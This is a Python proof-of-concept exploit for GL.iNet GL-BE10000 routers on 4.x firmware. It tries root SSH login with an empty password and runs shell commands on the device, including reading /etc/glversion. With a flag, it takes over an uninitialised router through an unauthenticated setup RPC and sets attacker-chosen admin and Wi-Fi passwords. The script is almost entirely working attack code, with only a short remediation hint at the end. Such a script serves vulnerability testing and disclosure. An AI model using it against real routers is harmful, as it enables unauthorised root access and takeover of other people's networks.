#!/usr/bin/env python3
"""
GL.iNet GL-BE10000 — Empty-root-password SSH backdoor PoC
Target: 4.8.4 firmware (and generally GL.iNet 4.x before first-time setup)

Checks two unauthenticated attack paths on the LAN:
  [1] SSH root login with EMPTY password (dropbear: PasswordAuth + RootPasswordAuth)
  [2] Web ui.init takeover when the router is uninitialized (inited=false)

USAGE:
    python3 gl_inet_poc.py <router_ip> [--port 22] [--cmd "id"] [--claim]

    --cmd    command to run via SSH after a successful empty-password login
    --claim  (dangerous) complete first-time setup via ui.start_initialization
"""
import argparse
import json
import socket
import sys

import paramiko
import requests


def banner():
    print("[+] GL.iNet empty-root-password PoC")
    print("[+] Target firmware class: GL.iNet 4.x (GL-BE10000) pre-initialized\n")


# ---------------------------------------------------------------- SSH path
def check_ssh(host, port, cmd="id"):
    print(f"[*] [1/2] Trying SSH root with EMPTY password on {host}:{port} ...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username="root", password="",
                       allow_agent=False, look_for_keys=False, timeout=8)
    except paramiko.AuthenticationException:
        print("[-] SSH: authentication failed (password NOT empty, or auth disabled)")
        return False
    except Exception as e:
        print(f"[-] SSH: connection error: {e}")
        return False

    print("[!] SSH: ROOT LOGIN WITH EMPTY PASSWORD SUCCEEDED")
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=10)
        out = stdout.read().decode(errors="replace").strip()
        err = stderr.read().decode(errors="replace").strip()
        print(f"[+] CMD ({cmd!r}) output:\n{out or err or '(no output)'}")
    except Exception as e:
        print(f"[-] CMD execution failed: {e}")
    client.close()
    return True


# --------------------------------------------------------- web ui.init path
def rpc(host, method, params, timeout=8):
    url = f"http://{host}/rpc"
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    try:
        r = requests.post(url, json=payload, timeout=timeout)
        return r.json()
    except Exception as e:
        print(f"[-] RPC error: {e}")
        return None


def check_web_init(host, claim=False):
    print(f"[*] [2/2] Checking web ui.init takeover on {host} ...")
    res = rpc(host, "call", ["", "ui", "check_initialized", {}])
    if not res or "result" not in res:
        print("[-] Web: check_initialized failed (not the GL.iNet oui-httpd API?)")
        return False

    inited = res["result"].get("initialized")
    print(f"[*] Web: initialized = {inited}")

    if inited is True:
        print("[-] Web: router already initialized -> ui.init is not usable")
        return False

    print("[!] Web: router is UNINITIALIZED -> unauthenticated takeover possible")
    if not claim:
        print("[*] (skip --claim to avoid changing the device; device left untouched)")
        return True

    # unauthenticated first-time setup: set admin + wifi passwords
    params = {
        "username": "root",
        "password": "Pwned123!",
        "password_wifi": "PwnedWifi!",
        "password_wifi_5g": "PwnedWifi5G!",
        "password_wifi_6g": "PwnedWifi6G!",
    }
    res = rpc(host, "call", ["", "ui", "start_initialization", params])
    print(f"[+] ui.start_initialization response: {json.dumps(res, indent=2)}")
    return True


# ------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description="GL.iNet empty-password PoC")
    ap.add_argument("host", help="router LAN IP, e.g. 192.168.8.1")
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--cmd", default="id; uname -a; cat /etc/glversion")
    ap.add_argument("--claim", action="store_true",
                    help="complete ui.start_initialization (changes device!)")
    ap.add_argument("--no-web", action="store_true", help="skip the web check")
    args = ap.parse_args()

    banner()

    ssh_ok = check_ssh(args.host, args.port, args.cmd)
    if not args.no_web:
        web_ok = check_web_init(args.host, claim=args.claim)
    else:
        web_ok = False

    print("\n[+] Summary:")
    print(f"    SSH empty-root-login : {'VULNERABLE' if ssh_ok else 'not exploitable'}")
    if not args.no_web:
        print(f"    ui.init takeover     : {'VULNERABLE' if web_ok else 'not exploitable'}")
    if ssh_ok or web_ok:
        print("\n[!] Device is exploitable on the LAN. Fix: run setup / 'passwd root',")
        print("    restrict SSH to key-only, and keep dnsmasq updated.")
    sys.exit(0)


if __name__ == "__main__":
    main()